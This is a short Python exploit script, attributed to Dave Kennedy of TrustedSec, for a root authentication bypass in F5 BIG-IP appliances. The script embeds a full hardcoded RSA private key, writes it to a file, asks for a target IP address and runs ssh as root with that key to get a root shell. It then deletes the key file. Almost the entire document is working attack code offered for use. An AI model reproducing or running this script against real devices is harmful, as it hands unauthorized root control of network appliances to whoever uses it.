#!/usr/bin/python
# coding=utf-8
#
# Title: F5 BIG-IP Remote Root Authentication Bypass Vulnerability (py)
#
# Quick script written by Dave Kennedy (ReL1K) for F5 authentication root bypass
# http://www.trustedsec.com
#
#
import os
import subprocess

try:
    with open("priv.key", 'w') as filewrite:
        filewrite.write("""-----BEGIN RSA PRIVATE KEY-----
        MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
        UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
        OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
        gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
        8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
        7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
        2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
        37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
        RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
        rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
        uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
        Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
        LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
        -----END RSA PRIVATE KEY-----""")
    subprocess.Popen("chmod 700 priv.key", shell=True).wait()
    print("""
    Title: F5 BIG-IP Remote Root Authentication Bypass Vulnerability (py)

    Quick script written by Dave Kennedy (ReL1K) for F5 authentication root bypass
    http://www.trustedsec.com
    """)
    ipaddr = input("Enter the IP address of the F5: ")
    subprocess.Popen("ssh -i priv.key root@{0}".format(ipaddr), shell=True).wait()
finally:
    if os.path.isfile("priv.key"):
        os.remove("priv.key")
